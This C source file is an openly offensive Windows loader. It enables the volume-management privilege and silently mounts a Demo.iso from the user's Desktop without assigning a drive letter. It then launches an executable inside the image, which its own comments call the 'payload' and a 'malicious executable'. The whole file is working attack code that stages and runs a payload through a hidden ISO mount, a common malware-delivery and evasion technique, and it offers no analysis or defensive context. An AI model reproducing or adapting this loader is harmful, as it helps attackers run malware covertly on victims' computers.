#include <Windows.h>
#include <virtdisk.h>
#include <stdio.h>
#include <initguid.h>
#include <sddl.h>

//necessary includes + PEB definition

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _LDR_MODULE {
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
    PVOID                   BaseAddress;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    UNICODE_STRING          FullDllName;
    UNICODE_STRING          BaseDllName;
    ULONG                   Flags;
    SHORT                   LoadCount;
    SHORT                   TlsIndex;
    LIST_ENTRY              HashTableEntry;
    ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
    ULONG                   Length;
    ULONG                   Initialized;
    PVOID                   SsHandle;
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBase;
    PPEB_LDR_DATA           LoaderData;
    PVOID                   ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PVOID                   FastPebLockRoutine;
    PVOID                   FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID*					KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PVOID                   FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID*					ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID**					ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, * PPEB;

PPEB RtlGetPeb(VOID);

#define DEFAULT_DATA_ALLOCATION_SIZE (MAX_PATH * sizeof(WCHAR))

int wmain(VOID)
{
    DWORD dwError = ERROR_SUCCESS;
    VIRTUAL_STORAGE_TYPE VirtualStorageType = { 0 };
    OPEN_VIRTUAL_DISK_PARAMETERS Parameters;
    ATTACH_VIRTUAL_DISK_PARAMETERS AttachParameters;
    HANDLE VirtualObject = NULL, hToken = NULL;
    WCHAR lpIsoPath[DEFAULT_DATA_ALLOCATION_SIZE] = { 0 };
    WCHAR lpIsoAbstractedPath[DEFAULT_DATA_ALLOCATION_SIZE] = { 0 };
    PPEB Peb = (PPEB)RtlGetPeb();
    static GUID VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT_EX = { 0xEC984AEC ,0xA0F9, 0x47e9, 0x901F, 0x71415A66345B };
    LUID Luid = { 0 };
    TOKEN_PRIVILEGES Tp = { 0 };
    PSECURITY_DESCRIPTOR Sd;
    DWORD dwData = DEFAULT_DATA_ALLOCATION_SIZE;
    STARTUPINFOW Info = { 0 };
    PROCESS_INFORMATION ProcessInformation = { 0 };

    //make sure we're on Windows 10
    if (Peb->OSMajorVersion != 0x0a)
	    goto FAILURE; 

    //get userprofile e.g. %SystemDrive%\Users\{username}
    if (GetEnvironmentVariableW(L"USERPROFILE", lpIsoPath, DEFAULT_DATA_ALLOCATION_SIZE) == 0)
	    goto FAILURE;
    else //append \\desktop\\demo.iso if successful
	    wcscat(lpIsoPath, L"\\Desktop\\Demo.iso");

    //get thread tokens
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
    {
	    if (!ImpersonateSelf(SecurityImpersonation))
		    goto FAILURE;

	    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
		    goto FAILURE;
    }

    //see if we have the privilege to manage volumes
    if (!LookupPrivilegeValueW(NULL, L"SeManageVolumePrivilege", &Luid))
	    goto FAILURE;

    Tp.PrivilegeCount = 1;
    Tp.Privileges[0].Luid = Luid;
    Tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    //get SeManageVolumePrivilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &Tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL))
	    goto FAILURE;

    VirtualStorageType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_ISO;
    VirtualStorageType.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT_EX;

    Parameters.Version = OPEN_VIRTUAL_DISK_VERSION_1;
    Parameters.Version1.RWDepth = OPEN_VIRTUAL_DISK_RW_DEPTH_DEFAULT;

    //open iso file
    if(OpenVirtualDisk(&VirtualStorageType, lpIsoPath, 
                       VIRTUAL_DISK_ACCESS_ATTACH_RO | VIRTUAL_DISK_ACCESS_GET_INFO, 
                       OPEN_VIRTUAL_DISK_FLAG_NONE, &Parameters, 
                       &VirtualObject) != ERROR_SUCCESS)
    {
	    goto FAILURE;
    }

    //attach to harddisk with no drive letter/path
    AttachParameters.Version = ATTACH_VIRTUAL_DISK_VERSION_1;
    if (AttachVirtualDisk(VirtualObject, 0, 
                          ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER, 
                          0, &AttachParameters, 0) != ERROR_SUCCESS)
    {
	    goto FAILURE;
    }

    
    //get physical path
    if (GetVirtualDiskPhysicalPath(VirtualObject, &dwData, lpIsoAbstractedPath) != ERROR_SUCCESS)
	    goto FAILURE;
    else //if we are able to get physical path, append payload exe that we know is inside of iso file
	    wcscat(lpIsoAbstractedPath, L"\\Demo.exe");

    //run malicious executable
    if (!CreateProcess(lpIsoAbstractedPath, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &Info, &ProcessInformation))
	    goto FAILURE;

    //close everything
    if (VirtualObject)
	    CloseHandle(VirtualObject);

    if (hToken)
	    CloseHandle(hToken);
    
    return ERROR_SUCCESS;

FAILURE: //generic error handling routine, get last error and close any handles that may be open

    dwError = GetLastError();

    if (VirtualObject)
	    CloseHandle(VirtualObject);

    if (hToken)
	    CloseHandle(hToken);

    return dwError;
}

PPEB RtlGetPeb(VOID)
{
    return (PPEB)__readgsqword(0x60);
}
